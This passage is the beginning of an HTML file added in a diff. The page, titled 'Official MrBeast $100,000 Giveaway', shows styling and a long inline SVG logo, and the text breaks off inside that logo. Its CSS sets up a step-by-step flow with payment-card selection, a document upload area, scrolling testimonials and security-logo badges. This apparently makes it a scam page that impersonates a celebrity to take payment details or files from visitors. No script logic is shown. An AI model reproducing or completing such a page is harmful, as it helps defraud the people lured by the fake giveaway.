@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Official MrBeast $100,000 Giveaway</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        :root {
+            --primary: #e62129;
+            --secondary: #f8f9fa;
+        }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            min-height: 100vh;
+        }
+        .page { display: none; }
+        .active { display: block; }
+        .testimonial-scroll {
+            animation: scroll 25s linear infinite;
+        }
+        @keyframes scroll {
+            0% { transform: translateY(100%); }
+            100% { transform: translateY(-100%); }
+        }
+        .card {
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            border-radius: 20px;
+            overflow: hidden;
+        }
+        .btn-primary {
+            background: var(--primary);
+            background: linear-gradient(135deg, var(--primary) 0%, #c81d25 100%);
+            transition: all 0.3s;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 7px 15px rgba(230, 33, 41, 0.3);
+        }
+        .upload-area {
+            border: 2px dashed #dee2e6;
+            transition: all 0.3s;
+        }
+        .upload-area:hover, .upload-area.dragover {
+            border-color: var(--primary);
+            background-color: rgba(230, 33, 41, 0.03);
+        }
+        .payment-card {
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+        .payment-card.active {
+            border-color: var(--primary);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        .loading-dots {
+            display: inline-block;
+        }
+        .loading-dots span {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--primary);
+            margin: 0 3px;
+            animation: bounce 1.5s infinite ease-in-out;
+        }
+        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        .security-logos {
+            filter: grayscale(100%);
+            opacity: 0.7;
+        }
+        .mrbeast-logo {
+            height: 4rem;
+            width: auto;
+        }
+    </style>
+</head>
+<body class="text-gray-800">
+    <!-- Page 1: Giveaway Introduction -->
+    <div id="page1" class="page active">
+        <div class="max-w-2xl mx-auto bg-white card my-10">
+            <div class="bg-red-600 py-4">
+                <div class="flex justify-center">
+                    <svg class="mrbeast-logo" viewBox="0 0 190.34 107.32">
+                        <path d="M364,333.23a20.39,20.39,0,0,1,6.75-2.89c2,.32,3.87.92,5.83,1.3,2.51.46,4.73,1.81,7.1,2.69,3.11,1.3,6.55,1.41,9.72,2.47a52.61,52.61,0,0,1,6.52,4.36c1.55,1.09,1.44,3.38,3,4.48,1.38,1.09,2.81,2.12,4.11,3.31,1.74,1.51,3,3.5,4.89,4.83a15.79,15.79,0,0,1,5.17,5.86c-1.33,2.47-2.31,5.46-5,6.84-2.6,1.22-3.71,4.2-6.28,5.47-1.12.84-3,1-3.34,2.58l2-.5c0,2.07-1.6,3.5-2.84,4.94-.11.88-.09,2.1-1.16,2.38-3,.91-4.54,4.74-7.9,4.44a21.27,21.27,0,0,1-9.83-3.19l2.86-.76-2.6-1.21c.76-.49,1.52-1,2.27-1.46-2.43-.24-4.22,1.67-5,3.77l-1.18-.89c-.11,5.73,2.9,11.06,7,14.88a47.84,47.84,0,0,1-19-10.38l-1.09,1.06a31.57,31.57,0,0,1-10-24.12l-.92,1.17a49.58,49.58,0,0,1,1.57-12.59c-10.83-1.42-21.69-2.72-32.51-4.2,9.86,0,19.73-.08,29.59.06-.2-.47-.39-.94-.58-1.41-1.76-.32-2.72-2-3.89-3.22-.57-.47-.39-1.18-.27-1.81l-1,0c-.57-1.47-1.36-3.12-.76-4.7.37-.85,1.39-.81,2.17-.92,3.69-.3,7.38-.66,11.07-1C361.86,334.93,362.86,333.87,364,333.23Zm5.87-1.69a27.73,27.73,0,0,0-6.3,3.1,30.27,30.27,0,0,1,3.26-.09c-.11.82-1,.75-1.56.88-5.23.47-10.46,1-15.69,1.45a3.55,3.55,0,0,0-1.46.33,6.18,6.18,0,0,0,.39,3.18c.62.12,1.23.26,1.83.44l-.52,1.63a30.1,30.1,0,0,0,2.48,2.61c.59.5,1.58.13,2.12.7,0,.28,0,.84,0,1.12l1.79.05.19,1c5.08-.07,10.15,0,15.22,0-2.92-1.42-5.8-3-8.82-4.14a1.23,1.23,0,0,1,1.22-.39q14.94.45,29.89.82l-2.16-2c1.6,1.12,3.54,2,4.27,4,.09-.87.17-1.75.34-2.62a12.05,12.05,0,0,1-.17,3.43l.33,1,2.1.39a27,27,0,0,1-3,.41l-.08-.47c-.36.5-.73,1-1.12,1.48.19-.59.4-1.16.61-1.74a18.75,18.75,0,0,1-3.06.74,24.53,24.53,0,0,1,1.29,2.33,5,5,0,0,0,2.49-1.55,5.42,5.42,0,0,0,.68,1.19c-1.25.11-2.25,1.15-3.54,1-3.26-.32-6.53-.41-9.79-.62q3,2.56,6,5.1c-1.52-.11-3-.46-4.54-.46-.84-.18-1.68-.35-2.53-.46-8.19-1-16.38-2.08-24.56-3.13a49.53,49.53,0,0,0-1.39,9.75l1-1.2a31,31,0,0,0,8.94,25.57l1.06-1.08a38.09,38.09,0,0,0,11.13,7.53,27.87,27.87,0,0,0,4.56,2.1,20.09,20.09,0,0,1-4.6-14.27c.67-.09,1.16.43,1.69.76a7.29,7.29,0,0,1,3.7-3.07,28.11,28.11,0,0,0-5.14-2.69c.64,1,1.33,2,2,3a36.58,36.58,0,0,0-8.35-4.57,23.16,23.16,0,0,0-6.26-2c4-.09,7.83,1.6,11.34,3.42.29-.3.6-.6.92-.87,1.87.14,3.35,1.43,5,2.1a33.62,33.62,0,0,0-4.33-4.46,17.78,17.78,0,0,1,7.69,7.32c-.45.35-.91.69-1.36,1a5,5,0,0,1,2.41,1.76l-2.23.73a26,26,0,0,0,7.62,1.78c.93.15,1.66-.56,2.43-1h-.25c1.32-.7,2.23-1.94,3.46-2.74.82-.42,1.77-.69,2.24-1.56a4.9,4.9,0,0,0-2.81.28,4,4,0,0,1-2.43-1.3l.82-1.49a16.32,16.32,0,0,1-3-1.91c.07-.34.2-1,.27-1.37-.43-.36-.91-.65-1.35-1q.13-.54.3-1.08l-.92-.59c-.17,2.65,1.32,5,3.14,6.74-.62-.45-1.25-.89-1.88-1.32.65,1,1.33,2.06,2.07,3l-1.24-.51c-3.26-3.19-4-8.25-2.7-12.49.94-2.42,3.45-3.63,5.38-5.15l1.16-.68.06,0,1.34-.68.05.71-.89.75c-.23.21-.44.44-.65.66h.28c.48.93.87,2.07,1.91,2.53a19.3,19.3,0,0,0,8,2.2,8.15,8.15,0,0,0,6.73-4.5l-1.65,0a36.25,36.25,0,0,1-2-5c-.25-1-1.32-1.31-2.11-1.77-1.79-1.05-4-.77-5.91-.16a15.75,15.75,0,0,0-2,2.26c.65-1.08,1.08-2.6,2.46-2.92a25.71,25.71,0,0,0,4.56-1.75c-1.89-.51-3.79.14-5.68.31,1.15-.4,2.33-.68,3.49-1a28.8,28.8,0,0,0-4.25-.63,18.08,18.08,0,0,1,4.88,0c-.94-.44-1.82-1-2.8-1.36a21.47,21.47,0,0,0-3.25-.12c.64-.15,1.27-.28,1.92-.38,2.28-.56,4,1.62,6.19,1.78-2-2.48-4.77-4.11-7.06-6.27-.21.64-.44,1.28-.7,1.91-.22-1.83.43-4.26-1.33-5.5a46.63,46.63,0,0,0-6.32-4.19c-4.45-1.3-9.12-1.62-13.63-2.73a29.32,29.32,0,0,1,4,.29c-1.3-.54-2.58-1.09-3.87-1.67-2-.91-4.14-1.12-6.2-1.69C372.1,331.67,371,331.14,369.86,331.54Zm-3,12.9q4.53,2.22,9.1,4.37c-9.43.12-18.85,0-28.28.05a67,67,0,0,0-7.57.2c4.61.38,9.17,1.12,13.77,1.66,10.69,1.35,21.37,2.74,32.06,4.08-1.76-1.52-3.55-3-5.32-4.54,3.89.16,7.78.41,11.67.59-.3-.7-.62-1.4-.95-2.08-.61-.2-1.23-.41-1.83-.62a20.44,20.44,0,0,0,5.8-1.4l-.4-1.55C385.53,345,376.18,344.65,366.83,344.44ZM406.48,352c.93.4,1.88.78,2.83,1.14l-.32-.78Zm.06,2.14a17.09,17.09,0,0,1,4.65,2.41c-.3-.71-.59-1.43-.84-2.16a9.22,9.22,0,0,1,1.64,4.16l2.14,0a23.1,23.1,0,0,0,2,1.52,14.9,14.9,0,0,0-5.71-6.13C409.2,353.22,407.78,353.91,406.54,354.16Zm5.4,4.8c.38,1,.82,2,1.26,3l1.78.16c-.53-.16-1.08-.3-1.62-.43q-.36-1.15-.7-2.3l1.28,0a13.11,13.11,0,0,0,1.82,1.34,22,22,0,0,0-1.65-1.87Zm-18,5.9c1.14,1.1,2.91,2.08,2.88,3.88a23.49,23.49,0,0,0,1.29,7.29c1.75-1.05,3.79-1.87,5-3.63-1.6.55-3.15,1.28-4.73,1.88,1.64-2.3,4.14-4.23,4.58-7.17a23.86,23.86,0,0,1-4.09-1.83c-1-.64-1.34-1.81-1.87-2.78C395.89,363.28,394.88,364.07,393.9,364.87Zm-.84.63a10.26,10.26,0,0,0-1.25,4.38c.68.49,1.39.95,2.11,1.38l-.38,1.19,1.36.78-.34,1.61c.84.50,1.68,1,2.53,1.46-1-2.63-1.1-5.46-1.42-8.22A10.12,10.12,0,0,0,393.06,365.49Zm10.72,1.87c-.09,1.8-1.22,3.21-2.29,4.56a20.84,20.84,0,0,0,5.81-3.94A24.5,24.5,0,0,1,403.78,367.37Zm.08,4.55a12.61,12.61,0,0,0,4.73-3.81A33.45,33.45,0,0,1,403.86,371.92Zm-6.38,5.44-.64,1,1.36.56a13,13,0,0,0,3.66-4A31.8,31.8,0,0,1,397.48,377.36Zm2.77,1.37a9.5,9.5,0,0,0,2.92-3.43C402.08,376.33,401.26,377.61,400.25,378.73Z" transform="translate(-288.83 -330.34)"/>
+                        <path d="M362.47,340.85a20,20,0,0,1,2-3.53,24.47,24.47,0,0,1-3,7.77A9.59,9.59,0,0,1,362,342c-3.88-.3-7.51-1.75-11.28-2.54.61-.3,1.18-1,1.92-.66C355.88,339.71,359.1,340.75,362.47,340.85Z" transform="translate(-288.83 -330.34)"/>
+                        <path d="M398.3,352.75l.4,1.62c-.56.43-1.11.86-1.68,1.28C397.45,354.68,397.89,353.72,398.3,352.75Z" transform="translate(-288.83 -330.34)"/>
+                        <path d="M396.75,357.24a11.17,11.17,0,0,0,2.44-3.64c-.12.77.32,1.77-.34,2.37A5.89,5.89,0,0,1,396.75,357.24Z" transform="translate(-288.83 -330.34)"/>
+                        <path d="M399.42,359.31a10.54,10.54,0,0,1,4.24-.86q.3.5.59,1c1.19.62,2.48,1,3.71,1.5-2.07-.54-4.11-1.2-6.18-1.77C401,359.17,400.21,359.31,399.42,359.31Z" transform="translate(-288.83 -330.34)"/>
+                        <path d="M390.91,378c1,.8,1.59,2.15,2.91,2.4,1,.24,1.94.38,2.91.6a5.2,5.2,0,0,1-4.27,0A7.23,7.23,0,0,1,390.91,378Z" transform="translate(-288.83 -330.34)"/>
+                        <path d="M324.95,400.76c1.49-.64,3.1-1.82,4.79-1.19a9.57,9.57,0,0,1,3.63,3c.57,1.52-.32,3.07-.9,4.44a52.59,52.59,0,0,1,13.62-2.19c2.71-.07,5.79-.09,8,1.62,1.26.84,1,2.47,1,3.77.09.85-.57,1.48-1,2.17l-.84.18c-2.17,3.19-6.88,2.85-9.18,5.88.56,3.44,1.08,6.89,1.49,10.36a27.78,27.78,0,0,0-1.37,3.26c-.8-.25-1.92-.08-2.39-.92-1.18-1.69-1.21-3.83-1.6-5.79a54.52,54.52,0,0,0-1.41-6.06l-1.63.25a10,10,0,0,0-1.89,2.22c-1.22,2.43-2.19,5-3.47,7.38-.48.78-1,1.54-1.49,2.31-1.31.12-2.62.23-3.94.22-.25-2,.83-3.87,1.32-5.79s1.39-3.76,1.74-5.73l.67-.44c1.32-3.1,3.13-5.95,4.43-9.06l-1.86,1c-.73-.52-1.46-1-2.23-1.5-1.36,2.29-2.36,4.76-3.58,7.12-1.41,2.8-2.27,5.84-3.6,8.67a85.92,85.92,0,0,0-1.68,8.58c-1.05-.59,0-1.91-.18-2.81-.45.8-.22,2.45-1.58,2.14l-.49,1.21-.72-.6-.38,1.06a4.34,4.34,0,0,1-3.4-1.35c.05-4.5,1.7-8.74,3.14-12.94,1-3,2.23-5.9,3.38-8.83-3.7,3.46-5.92,8.14-9.44,11.75-.94,1-1.64,2.23-2.61,3.23-1.25,1.23-3.07,1.46-4.72,1.7-1.47.2-1.89-1.48-2.15-2.58-.47-4.72,1.15-9.33,1.07-14a66.9,66.9,0,0,0-6.83,13.18c-.57,1.22-.49,2.61-.91,3.88-.42,1.53-1.37,2.85-1.84,4.37a4.17,4.17,0,0,1-1,1.54l-.25-1-.44.78c-1.14,0-2.45.61-3.46-.13-.11-3.34.85-6.61,1.74-9.8,2.48-7.22,4.76-14.56,8.31-21.34.72-1.35,1.8-2.86,3.42-3.06a6.53,6.53,0,0,0,3.56.77,8.43,8.43,0,0,1,4.5,1.25,3.77,3.77,0,0,1,1.73,3c-.27,2.58-1.31,5-1.72,7.57-.3,2-.87,4-1.2,6.09,1.76-2.13,3.09-4.57,4.84-6.71,1.37-2,3.13-3.65,4.65-5.52A37.77,37.77,0,0,1,324.95,400.76Zm16.47,9.12c-.18,2.29-1.93,4-2.83,6,4.31-2,9.25-3.12,12.73-6.56C348.08,408.32,344.66,409.31,341.42,409.87Z" transform="translate(-288.83 -330.34)"/>
+                        <path d="M376.27,400.53c4.22-.94,8.62-1.64,12.93-1,1.66.23,3.55,1.08,4,2.86a17.9,17.9,0,0,1-.35,4.54c-.43,1.53-2.08,2.12-3.17,3.1a35,35,0,0,1-7.33,4.76c-.67.23.14.7.4.79,2,.93,4.09,2,5.23,3.92a9.15,9.15,0,0,1,1.21,4.06,65.63,65.63,0,0,1,4.44-8.84c1.56-2.6,3.26-5.11,4.59-7.84a4.14,4.14,0,0,1,1.4-1.82c1.1-.52,1.75.84,2.45,1.43,4-.69,7.93-1.66,12-1.87a7.61,7.61,0,0,1,2.07.32,35.78,35.78,0,0,1-1.55,3.35,6.07,6.07,0,0,1-3.2,1.15,48,48,0,0,0-9.41,2.26c-1.29,2.19-3.23,3.92-4.33,6.23,1.15-.1,2.3-.22,3.45-.32-.33-.43-1.19-.94-.52-1.48,2.62-1.23,5.61-1.23,8.42-1.67,1.28-.09,3.16,0,3.38,1.6-2.55-.14-4.81,1.23-7.34,1.34.4.47.82.92,1.23,1.39-2,1.31-4.35,1.56-6.59,2.08-1.47.4-2.85,1-4.32,1.46a17.33,17.33,0,0,0-1.7,4.7c5.16-1.22,10-3.82,15.25-4.5l.61-.48c1.5-.28,3.27-.3,4.44-1.38,3.45-5.14,7-10.2,10.86-15a5,5,0,0,1,5.87-.53c.53.14,1.36-.15,1.61.53a8.67,8.67,0,0,1,.41,3,65.26,65.26,0,0,1-.44,8c1.1-.1,2.22-.19,3.33-.23,3-5,7.75-8.49,12.62-11.44,1.85-1.22,4.26-.62,6.16.16a5.49,5.49,0,0,1,2.41,1.82,47.89,47.89,0,0,0-1.22,6c-.22,2.1-3.4,2.58-4.62,1.1-.73-1.33-.1-2.79.41-4.06a19.69,19.69,0,0,0-5,2.88c-1.75,1.33-3.79,2.33-5.22,4,3.72.37,7.53-1.25,11.17,0,1.62.45,2.08,2.24,3,3.47a15.41,15.41,0,0,1-.78,3.34,9.11,9.11,0,0,1-4,2.6c-1.8.75-3.43,1.8-5.16,2.67a3.55,3.55,0,0,0-1.17,1c-1.63,0-3,1-4.43,1.54-.94.36-1.74,1.28-2.8,1.22a6.35,6.35,0,0,1-3.42-3c1.67-1.79,4.13-2.4,6.1-3.76,2.8-1.83,5.77-3.4,8.55-5.25a7.3,7.3,0,0,0-2.79,0c-2.48.47-5,.56-7.51,1-1.66-.05-2.15-2-2.79-3.18a8.42,8.42,0,0,0-2.77.93c-.42,1.92-.14,4-.9,5.81-.08-.69-.13-1.39-.18-2.08l-1.34-.26.92.31a26.17,26.17,0,0,1-.23,4h.79a12.56,12.56,0,0,1-1.17,5.77l-1,.68c-.26-.25-.51-.5-.74-.77-.86-4.11-.39-8.33-.69-12.49-2.67.54-5.3,1.24-7.95,1.87-1.22,2-2.52,4-3.7,6-.82,1.33-1.55,2.89-3,3.57-1.5.92-3.33.47-5,.51.31-3,2.28-5.5,3.63-8.14-.92.19-2.47,0-2.33,1.44a29.17,29.17,0,0,0-3.91,1.53c-.53.69-1.45.79-2.2,1.1-3.64,1.24-7,3.13-10.7,4.26-1.34.25-2.63-.41-3.87-.84-1-.3-1.39-1.42-1.77-2.31-2.81,2.69-6.63,3.74-10.08,5.32-2,1-4.28,1.14-6.39,1.81l2.31-1.27a14.76,14.76,0,0,0-4.76,1.1c0-.25,0-.74.05-1l-.17.89c-2,0-3.7,1.34-5.7,1.38-1,.2-1.94-.36-2.89-.64-.12-1.11-.74-2.4,0-3.4a9.47,9.47,0,0,1,1.6-1.23l-.53-.64c1-5.73,4.09-10.76,6.52-15.95.87-2.07,1.8-4.11,2.68-6.18a5.72,5.72,0,0,1-4.16-3.75c-.41-.87.42-1.69,1.13-2.07C369.73,402.51,373,401.6,376.27,400.53Zm3.81,5a14.32,14.32,0,0,0-2.84,1.09c.13,2.51-2,4.24-2.84,6.46,3.08-1.54,6-3.32,9.05-5a25.46,25.46,0,0,0,4.85-3.54C385.53,404.25,382.77,404.93,380.08,405.54Zm42.55,13.18c1.75-.39,3.5-.79,5.2-1.35,0-2,.16-3.93.24-5.89C426.17,413.81,424.4,416.27,422.64,418.72Zm-50.65.21c-1,1.67-1.36,3.68-2.59,5.19a11.67,11.67,0,0,0-2.70,3.15,12.29,12.29,0,0,0-1.84,3.15,9,9,0,0,0-1.76,1.3c6-2.07,12.16-3.49,17.89-6.16,1.42-.77,3.27-1.39,3.74-3.13-1.14-1.4-3-1.9-4.64-2.32C377.41,419.59,374.7,419.17,372,418.93Z" transform="translate(-288.83 -330.34)"/>
+                        <path d="M465.58,406.63c4.51-.5,9-1.58,13.58-1.2a7.46,7.46,0,0,1-.74,3.71c-1.93.57-4,.69-5.85,1.44a57.23,57.23,0,0,1-3.57,6.91c-1.63,3.57-2.8,7.34-4.47,10.89-.69,1.18-1.19,2.44-1.8,3.66-.37.89-1.5.45-2.24.52-.72.44-1.44.89-2.2,1.28.09-2.5,1-4.84,1.71-7.23A127.15,127.15,0,0,1,465.63,412c-1.51-.14-2.71.76-4.05,1.23-2,0-2.55-2.39-3.9-3.49.36-1,1.09-2.34,2.38-2.22A54,54,0,0,0,465.58,406.63Z" transform="translate(-288.83 -330.34)"/>
+                        <path d="M369.86,331.54c1.11-.39,2.24.13,3.33.33,2.07.56,4.24.78,6.2,1.69,1.28.57,2.57,1.12,3.87,1.67a29.32,29.32,0,0,0-4-.29c4.51,1.1,9.17,1.43,13.63,2.73a46.63,46.63,0,0,1,6.32,4.19c1.75,1.24,1.1,3.67,1.33,5.5.26-.62.49-1.26.7-1.91,2.29,2.15,5.06,3.79,7.06,6.27-2.22-.16-3.91-2.34-6.19-1.78-.65.1-1.28.23-1.92.38a21.47,21.47,0,0,1,3.25.12c1,.36,1.85.92,2.8,1.36a18.08,18.08,0,0,0-4.88,0,28.8,28.8,0,0,1,4.25.63c-1.16.36-2.34.64-3.49,1,1.89-.18,3.79-.82,5.68-.31a25.71,25.71,0,0,1-4.56,1.75c-1.38.32-1.81,1.84-2.46,2.92a15.75,15.75,0,0,1,2-2.26c1.89-.61,4.13-.89,5.91.16.79.46,1.86.78,2.11,1.77a36.25,36.25,0,0,0,2,5l1.65,0a8.15,8.15,0,0,1-6.73,4.5,19.3,19.3,0,0,1-8-2.2c-1-.46-1.42-1.6-1.91-2.53a68.27,68.27,0,0,1,7.37.09c-1.83.27-3.68.47-5.5.82a58.15,58.15,0,0,0,9.76.06c-.71-.13-1.42-.25-2.13-.36.88-.44,1.92-.84,2.31-1.84a6.51,6.51,0,0,0-4.14-2.56c1.19.89,2.46,1.7,3.66,2.58-3.91.72-7.64-1.19-11.52-1.23-2.56-.06-5.13-.68-7.68-.17,2.56.4,5.24.21,7.7,1.13l-1.16.68c-3.3,0-6.59.29-9.88.5,2.64.42,5.33.14,8,.27-2,1.29-4.66,2.41-5.23,5A12.63,12.63,0,0,0,391,377a5.62,5.62,0,0,0,2.87,2l1.24.51c-.74-1-1.42-2-2.07-3,.64.43,1.26.87,1.88,1.32l.71.68a4,4,0,0,0,2.43,1.3,4.9,4.9,0,0,1,2.81-.28c-.48.86-1.42,1.14-2.24,1.56-1.24.8-2.15,2-3.46,2.74a58.09,58.09,0,0,1-7-.68,14.47,14.47,0,0,0,.44-1.45,22.25,22.25,0,0,0-2-2.21,17.78,17.78,0,0,0-7.69-7.32,33.62,33.62,0,0,1,4.33,4.46c-1.69-.68-3.18-2-5-2.1-.32.28-.63.57-.92.87-3.51-1.82-7.3-3.51-11.34-3.42a23.16,23.16,0,0,1,6.26,2c2.32,1.79,5.66,3.28,6.08,6.53a20.09,20.09,0,0,0,4.6,14.27,27.87,27.87,0,0,1-4.56-2.1c-3.08-2.74-6.35-5.26-9.23-8.22l-.4-.51-.14,0-1-1c-.68.06-1.51.7-2.08.11a16.72,16.72,0,0,1-4-7c-.11-.42-.22-.84-.32-1.26a41.78,41.78,0,0,1-.19-15.8l-1.86.29a12.58,12.58,0,0,1,1.2-3.85,14.27,14.27,0,0,1,2.68-.1c5.59.24,11.19.32,16.78.54a38.12,38.12,0,0,0,4.9-.2c1.52,0,3,.34,4.54.46q-3-2.54-6-5.1c3.26.21,6.53.3,9.79.62,1.29.18,2.3-.86,3.54-1a5.42,5.42,0,0,1-.68-1.19c0-.2-.11-.59-.14-.79a27,27,0,0,0,3-.41l-2.1-.39-.33-1a12.05,12.05,0,0,0,.17-3.43c-.16.87-.25,1.75-.34,2.62-.73-1.95-2.67-2.88-4.27-4l2.16,2q-14.94-.39-29.89-.82a1.23,1.23,0,0,0-1.22.39c3,1.19,5.9,2.72,8.82,4.14-5.08,0-10.15,0-15.22,0l-.19-1-1.79-.05c0-.28,0-.84,0-1.12-.55-.57-1.53-.2-2.12-.7a30.1,30.1,0,0,1-2.48-2.61l.52-1.63c-.61-.18-1.22-.31-1.83-.44a6.18,6.18,0,0,1-.39-3.18,3.55,3.55,0,0,1,1.46-.33c5.23-.46,10.45-1,15.69-1.45.59-.14,1.45-.06,1.56-.88a30.27,30.27,0,0,0-3.26.09A27.73,27.73,0,0,1,369.86,331.54Zm-7.39,9.31c-3.37-.10-6.59-1.14-9.8-2.08-.74-.33-1.31.36-1.92.66,3.78.79,7.4,2.24,11.28,2.54a9.59,9.59,0,0,0-.57,3.13,24.47,24.47,0,0,0,3-7.77A20,20,0,0,0,362.47,340.85Zm35.83,11.9c-.41,1-.86,1.93-1.28,2.9.57-.41,1.12-.84,1.68-1.28Zm-1.56,4.49a5.89,5.89,0,0,0,2.1-1.27c.66-.6.22-1.6.34-2.37A11.17,11.17,0,0,1,396.75,357.24Zm2.28,1.07c.07.54.33.64.79.28C399.74,358,399.48,358,399,358.31Zm.4,1c.79,0,1.57-.14,2.36-.12,2.06.57,4.1,1.23,6.18,1.77-1.23-.52-2.52-.88-3.71-1.5q-.28-.51-.59-1A10.54,10.54,0,0,0,399.42,359.31ZM390.91,378a7.23,7.23,0,0,0,1.55,3,5.2,5.2,0,0,0,4.27,0c-1-.22-1.95-.36-2.91-.6C392.5,380.19,391.88,378.83,390.91,378Z" transform="translate(-288.83 -330.34)" style="fill:#00acd2"/>
+                        <path d="M406.48,352l2.51.36.32.78C408.35,352.8,407.41,352.42,406.48,352Z" transform="translate(-288.83 -330.34)" style="fill:#00acd2"/>
+                        <path d="M406.54,354.16c1.25-.25,2.66-.94,3.88-.22a14.9,14.9,0,0,1,5.71,6.13,23.1,23.1,0,0,1-2-1.52l-2.14,0a9.22,9.22,0,0,0-1.64-4.16c.25.73.54,1.45.84,2.16A17.09,17.09,0,0,0,406.54,354.16Z" transform="translate(-288.83 -330.34)" style="fill:#00acd2"/>
+                        <path d="M399.14,360.81a79.59,79.59,0,0,1,9.44,1.25c-3.45,0-6.88-.45-10.33-.49Z" transform="translate(-288.83 -330.34)" style="fill:#00acd2"/>
+                        <path d="M366.83,344.44c9.35.21,18.7.53,28,.73l.4,1.55a20.44,20.44,0,0,1-5.8,1.4c.6.22,1.21.43,1.83.62.33.69.64,1.39.95,2.08-3.89-.18-7.78-.43-11.67-.59,1.77,1.51,3.56,3,5.32,4.54-10.69-1.34-21.37-2.72-32.06-4.08-4.59-.53-9.16-1.27-13.77-1.66a67,67,0,0,1,7.57-.2c9.43,0,18.85.07,28.28-.05Q371.36,346.66,366.83,344.44Z" transform="translate(-288.83 -330.34)" style="fill:#e2447c"/>
+                        <path d="M411.94,359l2.16-.07a22,22,0,0,1,1.65,1.87,13.11,13.11,0,0,1-1.82-1.34l-1.28,0q.34,1.15.7,2.3c.54.13,1.08.27,1.62.43l-1.78-.16C412.76,361,412.32,360,411.94,359Z" transform="translate(-288.83 -330.34)" style="fill:#e2447c"/>
+                        <path d="M393.06,365.49a10.12,10.12,0,0,1,2.61,2.59c.32,2.76.4,5.59,1.42,8.22-.85-.48-1.69-1-2.53-1.46l.34-1.61-1.36-.78.38-1.19c-.72-.43-1.43-.89-2.11-1.38A10.26,10.26,0,0,1,393.06,365.49Z" transform="translate(-288.83 -330.34)" style="fill:#e2447c"/>
+                        <path d="M392,348.79a18.75,18.75,0,0,0,3.06-.74c-.21.58-.42,1.15-.61,1.74.39-.48.76-1,1.12-1.48l.08.47c0,.2.11.59.14.79a5,5,0,0,1-2.49,1.55A24.53,24.53,0,0,0,392,348.79Z" transform="translate(-288.83 -330.34)" style="fill:#fff"/>
+                        <path d="M403.78,367.37a24.5,24.5,0,0,0,3.53.62,20.84,20.84,0,0,1-5.81,3.94C402.56,370.58,403.7,369.17,403.78,367.37Z" transform="translate(-288.83 -330.34)" style="fill:#fff"/>
+                        <path d="M403.86,371.92a33.45,33.45,0,0,0,4.73-3.81A12.61,12.61,0,0,1,403.86,371.92Z" transform="translate(-288.83 -330.34)" style="fill:#fff"/>
+                        <path d="M391.77,371.13l.92.59q-.17.53-.3,1.08c.43.35.91.64,1.35,1-.07.34-.2,1-.27,1.37a16.32,16.32,0,0,0,3,1.91l-.82,1.49-.71-.68C393.09,376.09,391.6,373.78,391.77,371.13Z" transform="translate(-288.83 -330.34)" style="fill:#fff"/>
+                        <path d="M397.48,377.36a31.8,31.8,0,0,0,4.38-2.37,13,13,0,0,1-3.66,4l-1.36-.56Z" transform="translate(-288.83 -330.34)" style="fill:#fff"/>
+                        <path d="M400.25,378.73c1-1.12,1.83-2.4,2.92-3.43A9.5,9.5,0,0,1,400.25,378.73Z" transform="translate(-288.83 -330.34)" style="fill:#fff"/>
+                        <path d="M357.48,352.17c8.19,1,16.37,2.11,24.56,3.13.85.11,1.69.28,2.53.46a38.12,38.12,0,0,1-4.9.2c-5.59-.22-11.19-.3-16.78-.54a14.27,14.27,0,0,0-2.68.1a12.58,12.58,0,0,0-1.2,3.85l1.86-.29a41.78,41.78,0,0,0,.19,15.8c.11.42.21.84.32,1.26a16.72,16.72,0,0,0,4,7c.57.59,1.41,0,2.08-.11l1,1,.14,0,.4.51c2.89,3,6.16,5.48,9.23,8.22a38.09,38.09,0,0,1-11.13-7.53l-1.06,1.08a31,31,0,0,1-8.94-25.57l-1,1.2A49.53,49.53,0,0,1,357.48,352.17Z" transform="translate(-288.83 -330.34)" style="fill:#00819c"/>
+                        <path d="M399,358.31c.46-.36.72-.26.79.28C399.35,358.95,399.09,358.85,399,358.31Z" transform="translate(-288.83 -330.34)" style="fill:#00819c"/>
+                        <path d="M405.54,358.45a6.51,6.51,0,0,1,4.14,2.56c-.39,1-1.42,1.4-2.31,1.84.71.11,1.42.23,2.13.36a58.15,58.15,0,0,1-9.76-.06c1.82-.36,3.67-.55,5.5-.82a68.27,68.27,0,0,0-7.37-.09h-.28c.21-.23.42-.46.65-.66,3.45,0,6.88.46,10.33.49a79.59,79.59,0,0,0-9.44-1.25l-.05-.71-1.34.68-.06,0c-2.46-.92-5.14-.73-7.70-1.13,2.56-.51,5.12.11,7.68.17,3.88,0,7.61,1.95,11.52,1.23C408,360.15,406.73,359.35,405.54,358.45Z" transform="translate(-288.83 -330.34)" style="fill:#00819c"/>
+                        <path d="M386.65,361.94c3.29-.20,6.58-.52,9.88-.5-1.93,1.52-4.44,2.73-5.38,5.15-1.32,4.24-.56,9.3,2.7,12.49a5.62,5.62,0,0,1-2.87-2,12.63,12.63,0,0,1-1.57-9.81c.57-2.59,3.21-3.72,5.23-5C392,362.09,389.3,362.36,386.65,361.94Z" transform="translate(-288.83 -330.34)" style="fill:#00819c"/>
+                        <path d="M372.13,374a36.58,36.58,0,0,1,8.35,4.57c-.68-1-1.37-2-2-3a28.11,28.11,0,0,1,5.14,2.69,7.29,7.29,0,0,0-3.7,3.07c-.53-.33-1-.84-1.69-.76C377.79,377.32,374.45,375.84,372.13,374Z" transform="translate(-288.83 -330.34)" style="fill:#00819c"/>
